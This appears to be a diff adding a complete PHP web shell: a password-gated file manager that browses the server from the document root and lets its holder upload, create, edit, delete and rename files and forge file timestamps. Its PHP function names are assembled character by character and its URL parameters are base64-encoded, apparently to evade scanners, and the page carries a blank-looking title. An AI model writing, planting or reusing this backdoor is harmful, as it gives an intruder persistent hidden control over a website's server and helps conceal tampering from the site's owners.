@@ -1,0 +1,252 @@
+<?php
+
+$scd  = "s"."c"."a"."n"."d"."i"."r";
+$ril  = "r"."e"."a"."l"."p"."a"."t"."h";
+$isd  = "i"."s"."_"."d"."i"."r";
+$isw  = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
+$mup  = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
+$fgc  = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+$fpc  = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+$htm  = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
+$unl  = "u"."n"."l"."i"."n"."k";
+$rnm  = "r"."e"."n"."a"."m"."e";
+$drnm = "d"."i"."r"."n"."a"."m"."e";
+$bs   = "b"."a"."s"."e"."n"."a"."m"."e";
+$be   = "b"."a"."s"."e"."6"."4"."_"."e"."n"."c"."o"."d"."e";
+$bd   = "b"."a"."s"."e"."6"."4"."_"."d"."e"."c"."o"."d"."e";
+$chd  = "c"."h"."d"."i"."r";
+$tch  = "t"."o"."u"."c"."h";
+
+session_start();
+$pw='97b9de9429b8f223a44f3773ccbb06ce6fb9c6c03ea868b36a6776e47baef652';
+if(isset($_POST['p'])&&hash_equals($pw,hash('sha256',$_POST['p'])))$_SESSION['a']=1;
+if(isset($_GET['o'])){session_destroy();header('Location: '.$_SERVER['PHP_SELF']);exit;}
+
+function root(){
+  $r=isset($_SERVER['DOCUMENT_ROOT'])&&is_dir($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:dirname(__FILE__);
+  return rtrim(str_replace('\\','/',$r),'/');
+}
+
+// decode base64 GET params seperti referensi
+foreach($_GET as $k=>$v)$_GET[$k]=$bd($v);
+
+$dir=isset($_GET['d'])&&$_GET['d']?$_GET['d']:root();
+$dir=rtrim(str_replace('\\','/',$ril($dir)?:root()),'/');
+$chd($dir);
+
+$msg='';
+$view='';
+
+if(!isset($_SESSION['a'])){
+  echo'<form method=post style="display:flex;align-items:center;justify-content:center;height:100vh;background:#111"><input type=password name=p placeholder=password style="padding:8px;background:#222;border:1px solid #333;color:#ddd;border-radius:3px;font-family:monospace;font-size:13px"><button style="margin-left:6px;padding:8px 14px;background:#1a5a35;border:none;color:#4fe;border-radius:3px;cursor:pointer;font-family:monospace">ok</button></form>';
+  exit;
+}
+
+// ── POST actions ──────────────────────────────────────────────────────────────
+if($_SERVER['REQUEST_METHOD']==='POST'){
+
+  // upload
+  if(isset($_FILES['fu'])){
+    $tg=$dir.'/'.$bs($_FILES['fu']['name']);
+    $msg=$mup($_FILES['fu']['tmp_name'],$tg)?'uploaded: '.$bs($_FILES['fu']['name']):'upload failed';
+  }
+
+  // create file
+  elseif(isset($_POST['mk_f'])&&$_POST['mk_f']!==''){
+    $fp=$dir.'/'.$bs($_POST['mk_f']);
+    $msg=file_exists($fp)?'already exists':($fpc($fp,'')!==false?'created: '.$_POST['mk_f']:'create failed');
+  }
+
+  // create folder
+  elseif(isset($_POST['mk_d'])&&$_POST['mk_d']!==''){
+    $fp=$dir.'/'.$bs($_POST['mk_d']);
+    $msg=file_exists($fp)?'already exists':(mkdir($fp)?'folder created':'mkdir failed');
+  }
+
+  // save file
+  elseif(isset($_POST['sv_f'])&&isset($_POST['sv_c'])){
+    $fp=$dir.'/'.$_POST['sv_f'];
+    $msg=$fpc($fp,$_POST['sv_c'])!==false?'saved: '.$_POST['sv_f']:'save failed';
+  }
+
+  // view/edit file
+  elseif(isset($_POST['vw_f'])){
+    $fp=$dir.'/'.$_POST['vw_f'];
+    $c=$fgc($fp);
+    $view=$c!==false?$c:false;
+    $view_name=$_POST['vw_f'];
+  }
+
+  // delete
+  elseif(isset($_POST['rm_f'])){
+    $fp=$dir.'/'.$_POST['rm_f'];
+    if($isd($fp))$msg=rmdir($fp)?'deleted folder':'delete failed (empty folder only)';
+    else $msg=$unl($fp)?'deleted: '.$_POST['rm_f']:'delete failed';
+  }
+
+  // rename
+  elseif(isset($_POST['rn_o'])&&isset($_POST['rn_n'])&&$_POST['rn_n']!==''){
+    $old=$dir.'/'.$_POST['rn_o'];
+    $new=$dir.'/'.$bs($_POST['rn_n']);
+    $msg=$rnm($old,$new)?'renamed':'rename failed';
+  }
+
+  // touch
+  elseif(isset($_POST['td_f'])&&isset($_POST['td_t'])){
+    $fp=$dir.'/'.$_POST['td_f'];
+    $t=strtotime($_POST['td_t']);
+    $msg=$tch($fp,$t,$t)?'date changed':'touch failed';
+  }
+}
+
+// ── breadcrumb ────────────────────────────────────────────────────────────────
+$parts=explode('/',$dir);
+$crumb='';$cp='';
+foreach($parts as $i=>$p){
+  if($p==='')continue;
+  $cp.='/'.$p;
+  $crumb.='/<a href="?d='.$be($cp).'">'.$htm($p).'</a>';
+}
+
+// ── scan dir ──────────────────────────────────────────────────────────────────
+$entries=$scd($dir);
+$files=[];
+if($entries){
+  foreach($entries as $n){
+    if($n==='.')continue;
+    $fp=$dir.'/'.$n;
+    $files[]=['n'=>$n,'d'=>$isd($fp),'s'=>$isd($fp)?'-':filesize($fp),'m'=>filemtime($fp),'w'=>$isw($fp),'fp'=>$fp];
+  }
+  usort($files,function($a,$b){if($a['d']!==$b['d'])return $a['d']?-1:1;return strcmp($a['n'],$b['n']);});
+}
+
+$qs='d='.$be($dir);
+?><!DOCTYPE html><html><head><meta charset=utf-8><title>.</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#bbb;font:13px monospace}
+a{color:#4af;text-decoration:none}a:hover{text-decoration:underline}
+#bar{background:#181818;padding:7px 12px;border-bottom:1px solid #222;display:flex;align-items:center;gap:8px;flex-wrap:wrap;position:sticky;top:0;z-index:10}
+.crumb{flex:1;color:#555;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.crumb a{color:#4af}
+bt,input[type=submit]{padding:3px 9px;background:#1e1e1e;border:1px solid #2e2e2e;color:#aaa;cursor:pointer;border-radius:3px;font:12px monospace}
+bt:hover,input[type=submit]:hover{background:#272727;color:#fff}
+.g{background:#0c2218!important;border-color:#1a4a2a!important;color:#3a9!important}
+.r{background:#200c0c!important;border-color:#4a1a1a!important;color:#c44!important}
+#msg{padding:5px 12px;font-size:12px;color:#3a9;background:#0a1a0e;border-bottom:1px solid #1a3a1e}
+table{width:100%;border-collapse:collapse}
+th{background:#141414;padding:5px 10px;text-align:left;border-bottom:1px solid #1e1e1e;color:#555;font-weight:normal;font-size:11px}
+td{padding:4px 10px;border-bottom:1px solid #161616;vertical-align:middle;font-size:12px}
+tr:hover td{background:#141414}
+.dn{color:#fa8}.nw{color:#c44;font-size:10px}
+.sz{color:#3a3a3a;text-align:right;white-space:nowrap}
+.dt{color:#333;white-space:nowrap}
+.ac{display:flex;gap:3px;flex-wrap:nowrap;justify-content:flex-end}
+.ac input[type=submit]{font-size:11px;padding:2px 7px}
+.ac input[type=text]{width:90px;padding:2px 5px;background:#1a1a1a;border:1px solid #2a2a2a;color:#ddd;border-radius:3px;font:11px monospace}
+#edit{background:#161616;padding:12px;border-top:1px solid #222}
+#edit textarea{width:100%;height:400px;background:#0c0c0c;border:1px solid #222;color:#ccc;padding:8px;font:12px monospace;resize:vertical;border-radius:3px;outline:none}
+#edit textarea:focus{border-color:#2a5a3a}
+#edit .eh{padding:6px 0;color:#888;font-size:12px;display:flex;justify-content:space-between;align-items:center}
+.fi{background:#1a1a1a;border:1px solid #2a2a2a;color:#ddd;padding:4px 7px;border-radius:3px;font:12px monospace;outline:none}
+.fi:focus{border-color:#2a5a3a}
+form{display:inline}
+</style></head><body>
+
+<div id=bar>
+  <a href="?d=<?=$be($dir)?>"><bt>↺</bt></a>
+  <a href="?d=<?=$be(dirname($dir))?>"><bt>↑</bt></a>
+  <span class=crumb><?=$crumb?></span>
+
+  <!-- upload -->
+  <form method=post enctype=multipart/form-data>
+    <input type=hidden name=dummy value=1>
+    <input type=file name=fu style="display:none" id=fu onchange="this.form.submit()">
+    <bt onclick="document.getElementById('fu').click();return false">↑ upload</bt>
+  </form>
+
+  <!-- new file -->
+  <form method=post>
+    <input type=hidden name=dummy value=1>
+    <input class=fi type=text name=mk_f placeholder="new file" style="width:100px">
+    <input class=g type=submit value="+f">
+  </form>
+
+  <!-- new folder -->
+  <form method=post>
+    <input type=hidden name=dummy value=1>
+    <input class=fi type=text name=mk_d placeholder="new folder" style="width:100px">
+    <input class=g type=submit value="+d">
+  </form>
+
+  <a href="?o"><bt class=r>exit</bt></a>
+</div>
+
+<?php if($msg):?><div id=msg><?=htmlspecialchars($msg)?></div><?php endif?>
+
+<!-- edit area -->
+<?php if(isset($view)&&$view!==false):?>
+<div id=edit>
+  <div class=eh>
+    <span>editing: <b><?=$htm($view_name)?></b></span>
+    <a href="?<?=$qs?>"><bt>close</bt></a>
+  </div>
+  <form method=post>
+    <input type=hidden name=sv_f value="<?=$htm($view_name)?>">
+    <textarea name=sv_c><?=$htm($view)?></textarea><br>
+    <input class=g type=submit value="save" style="margin-top:6px">
+  </form>
+</div>
+<?php elseif(isset($view)&&$view===false):?>
+<div id=msg style="color:#c44">cannot read file</div>
+<?php endif?>
+
+<table>
+<thead><tr>
+  <th>Name</th><th>Date</th><th style=text-align:right>Size</th><th>Actions</th>
+</tr></thead>
+<tbody>
+<?php foreach($files as $f):
+  $n=$htm($f['n']);
+  $raw=$f['n'];
+  $isdir=$f['d'];
+  $href=$isdir?'?d='.$be($f['fp']):'?'.$qs;
+  $dt=date('Y-m-d H:i',$f['m']);
+  $sz=is_numeric($f['s'])?number_format($f['s']):$f['s'];
+  $perm=$f['w']?'':'<span class=nw>?</span>';
+?>
+<tr>
+  <td><?=$perm?><?php if($isdir):?><span class=dn>? <a href="<?=$href?>"><?=$n?></a></span>
+  <?php else:?><form method=post style="display:inline">
+    <input type=hidden name=vw_f value="<?=$n?>">
+    <input type=submit value="? <?=$n?>" style="background:none;border:none;color:#4af;cursor:pointer;font:13px monospace;padding:0;text-align:left">
+  </form><?php endif?></td>
+  <td class=dt><?=$dt?></td>
+  <td class=sz><?=$sz?></td>
+  <td><div class=ac>
+
+    <!-- delete -->
+    <form method=post onsubmit="return confirm('delete <?=$n?>?')">
+      <input type=hidden name=rm_f value="<?=$n?>">
+      <input class=r type=submit value="del">
+    </form>
+
+    <!-- rename -->
+    <form method=post>
+      <input type=hidden name=rn_o value="<?=$n?>">
+      <input class=fi type=text name=rn_n placeholder="<?=$n?>" style="width:80px;font-size:11px;padding:2px 5px">
+      <input type=submit value="ren">
+    </form>
+
+    <!-- touch -->
+    <form method=post>
+      <input type=hidden name=td_f value="<?=$n?>">
+      <input class=fi type=datetime-local name=td_t value="<?=date('Y-m-d\TH:i',$f['m'])?>" style="width:140px;font-size:11px;padding:2px 5px">
+      <input type=submit value="date">
+    </form>
+
+  </div></td>
+</tr>
+<?php endforeach?>
+</tbody>
+</table>
+</body></html>
